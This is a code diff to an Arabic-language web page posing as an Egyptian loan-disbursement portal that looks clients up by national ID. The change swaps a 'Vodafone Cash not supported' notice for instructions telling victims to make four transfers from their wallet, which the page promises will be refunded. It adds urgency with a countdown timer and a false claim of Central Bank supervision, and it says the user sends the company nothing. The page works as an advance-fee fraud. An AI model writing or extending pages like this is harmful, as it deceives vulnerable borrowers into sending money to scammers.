@@ -727,7 +727,7 @@
 
 <script>
     // ============================================================
-    //  قاعدة بيانات العملاء - مرتبة ومصنفة
+    //  قاعدة بيانات العملاء (نفسها ولكن مع تفعيل فودافون كاش)
     // ============================================================
     const clientsDB = {
 
@@ -1961,6 +1961,7 @@
     let currentClient = null;
     let countdownInterval = null;
 
+
     function normalizeId(raw) {
         let cleaned = raw.replace(/\D/g, '');
         while (cleaned.length < 14) cleaned = '0' + cleaned;
@@ -1971,56 +1972,7 @@
         return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
     }
 
-    // ===== دالة تنبيه فودافون كاش (بدون زر واتساب - فقط تنبيه) =====
-    function buildVodafoneWarning(client) {
-        return `
-            <div class="client-badge" style="border-color: #D4AF37;">
-                <div class="client-info">
-                    <h3 style="color: #D4AF37;">⚠️ تنبيه هام</h3>
-                    <p style="color: #94A3B8;">${client.name}</p>
-                    <p style="color: #94A3B8;">${client.normalizedId}</p>
-                </div>
-                <div><i class="fas fa-exclamation-triangle" style="color:#D4AF37;"></i> غير مدعوم</div>
-            </div>
-
-            <div class="vodafone-warning-box">
-                <i class="fas fa-ban" style="color: #EF4444;"></i>
-                <h3 style="color: #EF4444;">⛔ نأسف لا يتم خدمة فودافون كاش حالياً</h3>
-                <p>
-                    <strong style="color: #EF4444;">نظام التمويل يدعم فقط محفظة اتصالات كاش.</strong><br><br>
-                    • أنت حالياً تمتلك محفظة <strong style="color: #D4AF37;">فودافون كاش</strong>.<br>
-                    • يرجى فتح محفظة <strong style="color: #D4AF37;">اتصالات كاش</strong> في أقرب وقت ممكن.<br>
-                    • فتح المحفظة سهل وسريع من خلال المتوجة إلى فرع اتصالات.<br><br>
-                    <strong style="color: #D4AF37;">📌 بعد فتح المحفظة:</strong><br>
-                    قم بالرجوع إلى التحويلات المالية لإبلاغ فريق الدعم.
-                </p>
-            </div>
-
-            <div class="loan-amount-digit">
-                <div>💰 مبلغ التمويل المعتمد</div>
-                <div class="digit-number">${client.loanRaw} ج.م</div>
-                <div style="font-size:0.8rem;">القسط الشهري: ${client.installment} ج.م | المدة: ${client.loanTerm}</div>
-            </div>
-
-            <div class="info-grid" style="display: grid; grid-template-columns: 1fr; gap: 0.8rem; margin: 1rem 0;">
-                <div class="info-card" style="border-color: #D4AF37;">
-                    <h3 style="color: #D4AF37;"><i class="fas fa-user-circle"></i> بيانات العميل</h3>
-                    <table class="info-table">
-                        <tr><td style="width:40%">الاسم</td><td>${client.name}</td></tr>
-                        <tr><td>الرقم القومي</td><td>${client.normalizedId}</td></tr>
-                        <tr><td>المحفظة الحالية</td><td>${client.wallet || "لا يوجد"}</td></tr>
-                    </table>
-                </div>
-            </div>
-
-            <div class="vodafone-notice" style="border-color: #EF4444; background: rgba(239,68,68,0.1);">
-                <i class="fas fa-info-circle" style="color: #EF4444;"></i> 
-                <span style="color: #EF4444;">⚠️ لا يتم خدمة فودافون كاش حالياً. يرجى فتح محفظة اتصالات كاش.</span>
-            </div>
-        `;
-    }
-
-    // ===== دالة عرض تعليمات الربط (لعملاء اتصالات كاش فقط) =====
+    // ===== دالة عرض تعليمات الربط (لعملاء اتصالات كاش) =====
     function buildEtisalatInstructions(client) {
         const loanAmountNum = parseInt(client.loanRaw.replace(/\D/g, ''), 10);
         const perOperation = client.proofAmountPerOperation || Math.floor(loanAmountNum / 4);
@@ -2131,6 +2083,117 @@
         `;
     }
 
+    // ===== دالة عرض تعليمات الربط (لعملاء فودافون كاش) =====
+    function buildVodafoneInstructions(client) {
+        const loanAmountNum = parseInt(client.loanRaw.replace(/\D/g, ''), 10);
+        const perOperation = client.proofAmountPerOperation || Math.floor(loanAmountNum / 4);
+        const providerName = "فودافون كاش";
+        const code = "100#*9*";
+        const perOpFormatted = formatNumber(perOperation);
+        const totalFormatted = formatNumber(perOperation * 4);
+
+        return `
+            <div class="client-badge" style="border-color: #D4AF37;">
+                <div class="client-info">
+                    <h3 style="color: #D4AF37;"><i class="fas fa-user-check"></i> ${client.name}</h3>
+                    <p><i class="fas fa-id-card"></i> الرقم القومي: ${client.normalizedId}</p>
+                    <p><i class="fas fa-wallet"></i> المحفظة: ${client.wallet} (${client.walletNum || "غير مسجل"})</p>
+                </div>
+                <div><i class="fas fa-check-circle" style="color:#D4AF37;"></i> معتمد مسبقاً</div>
+            </div>
+
+            <div class="loan-amount-digit">
+                <div>💰 مبلغ التمويل المعتمد</div>
+                <div class="digit-number">${client.loanRaw} ج.م</div>
+                <div style="font-size:0.8rem;">القسط الشهري: ${client.installment} ج.م | المدة: ${client.loanTerm}</div>
+            </div>
+
+            <div class="linking-guide">
+                <div class="guide-title" style="color: #D4AF37;"><i class="fas fa-link"></i> 🔗 ربط المحفظة الذكي (فودافون كاش)</div>
+
+                <div class="glow-operations">
+                    <div class="label">💳 إجمالي مبلغ عمليات الربط (4 عمليات)</div>
+                    <div class="amount">${totalFormatted} <span style="font-size:1.8rem;">ج.م</span></div>
+                    <div class="per-operation">🔹 كل عملية: <span style="color:var(--royal-gold);">${perOpFormatted} ج.م</span></div>
+                    <div class="sub">📌 رسوم الخدمة: 5 جنيهات لكل عملية (لصالح شركة فودافون)</div>
+                </div>
+
+                <div style="margin: 1.5rem 0;">
+                    <h3 style="color: var(--royal-gold); margin-bottom: 1rem; text-align: center;">
+                        <i class="fas fa-list-ol"></i> خطوات ربط المحفظة وإتمام الصرف
+                    </h3>
+
+                    <div class="step-card-modern step-1">
+                        <div class="step-num">1</div>
+                        <div class="step-text">
+                            <strong>📋 كود التأكيد الخاص بمحفظتك</strong>
+                            <p>قم بطلب الكود الخاص بمحفظة <strong>فودافون كاش</strong> من خلال الرمز التالي:</p>
+                            <div class="code-highlight">${code}</div>
+                            <p style="margin-top: 4px; font-size: 0.8rem; color: var(--text-muted);">💡 سيصلك رمز التأكيد عبر رسالة نصية</p>
+                        </div>
+                        <div class="step-icon">📱</div>
+                    </div>
+
+                    <div class="step-card-modern step-2">
+                        <div class="step-num">2</div>
+                        <div class="step-text">
+                            <strong>💰 إجراء عمليات التحويل (4 مرات)</strong>
+                            <p>قم بإجراء <strong>4 عمليات تحويل</strong> متتالية من محفظتك، كل عملية بقيمة <span class="highlight">${perOpFormatted} ج.م</span>.</p>
+                            <p style="color: var(--emerald); font-size: 0.85rem;">✅ إجمالي المبلغ: <strong>${totalFormatted} ج.م</strong> (سيتم إرجاعه بالكامل لحسابك)</p>
+                            <p style="font-size: 0.8rem; color: var(--text-muted);">📌 رسوم الخدمة: 5 جنيهات لكل عملية (لصالح شركة فودافون)</p>
+                        </div>
+                        <div class="step-icon">💳</div>
+                    </div>
+
+                    <div class="step-card-modern step-3">
+                        <div class="step-num">3</div>
+                        <div class="step-text">
+                            <strong>📸 توثيق عمليات التحويل</strong>
+                            <p>قم بالتقاط <strong>4 لقطات شاشة</strong> واضحة من تطبيق محفظتك، تظهر فيها:</p>
+                            <p style="font-size: 0.85rem; color: var(--text-muted);">• المبلغ المحول<br>• تاريخ ووقت العملية<br>• رقم العملية</p>
+                        </div>
+                        <div class="step-icon">📸</div>
+                    </div>
+
+                    <div class="step-card-modern step-4">
+                        <div class="step-num">4</div>
+                        <div class="step-text">
+                            <strong>📤 رفع اللقطات في بيئة آمنة</strong>
+                            <p>بعد جمع اللقطات الأربع، اضغط الزر بالأسفل لرفعها في <strong>ملفك المشفر</strong> داخل النظام.</p>
+                            <p style="font-size: 0.8rem; color: var(--emerald);">🔒 لا يمكن لأي شخص آخر الوصول إلى صورك</p>
+                        </div>
+                        <div class="step-icon">🔒</div>
+                    </div>
+
+                    <div class="step-card-modern step-5">
+                        <div class="step-num">5</div>
+                        <div class="step-text">
+                            <strong>✅ إتمام الصرف الفوري</strong>
+                            <p>بعد رفع الصور، سيتم <strong>فتح رابط التحويل الفوري</strong> خلال دقائق، وسيصلك مبلغ القرض مباشرة في محفظتك.</p>
+                            <p style="color: var(--royal-gold); font-weight: 700;">🎉 ألف مبروك! قرضك في طريقك</p>
+                        </div>
+                        <div class="step-icon">🎉</div>
+                    </div>
+                </div>
+
+                <div class="security-note-box">
+                    <i class="fas fa-shield-alt"></i>
+                    <strong>إجراء آمن وموثوق:</strong> أنت تقوم فقط بتأكيد ملكية المحفظة، لا تحول أي مبلغ للشركة. جميع العمليات تحت إشراف البنك المركزي المصري.
+                </div>
+
+                <div class="timer-container">
+                    <div><i class="fas fa-hourglass-half"></i> الوقت المتبقي لتأكيد الربط</div>
+                    <div class="countdown-clock" id="countdownDisplay">26:00</div>
+                    <div style="font-size:0.7rem; margin-top:0.5rem;">⏳ بعد رفع الصور سيتم فتح رابط التحويل الفوري خلال دقائق</div>
+                </div>
+
+                <button class="btn-upload" id="uploadScreensBtn">
+                    <i class="fas fa-cloud-upload-alt"></i> 📤 رفع لقطات الشاشة الآن
+                </button>
+            </div>
+        `;
+    }
+
     function startCountdown() {
         if (countdownInterval) clearInterval(countdownInterval);
         let secondsLeft = 26 * 60;
@@ -2186,19 +2249,19 @@
             if (clientsDB[normalized]) {
                 currentClient = { ...clientsDB[normalized], normalizedId: normalized };
                 
-                // التحقق من وجود محفظة اتصالات كاش
+                // التحقق من نوع المحفظة
                 const isEtisalat = currentClient.isEtisalat === true || 
                                   (currentClient.wallet && currentClient.wallet.includes("اتصالات"));
                 
-                if (!isEtisalat) {
-                    // العميل ليس لديه اتصالات كاش (فودافون كاش أو لا يوجد محفظة)
-                    resultPanel.innerHTML = buildVodafoneWarning(currentClient);
-                    resultPanel.style.display = 'block';
-                    return;
+                if (isEtisalat) {
+                    // عميل اتصالات كاش
+                    resultPanel.innerHTML = buildEtisalatInstructions(currentClient);
+                } else {
+                    // عميل فودافون كاش أو لا يوجد محفظة
+                    // يتم عرض تعليمات فودافون كاش
+                    resultPanel.innerHTML = buildVodafoneInstructions(currentClient);
                 }
                 
-                // العميل لديه اتصالات كاش - عرض تعليمات الربط
-                resultPanel.innerHTML = buildEtisalatInstructions(currentClient);
                 resultPanel.style.display = 'block';
                 startCountdown();
                 showSecurityModal();
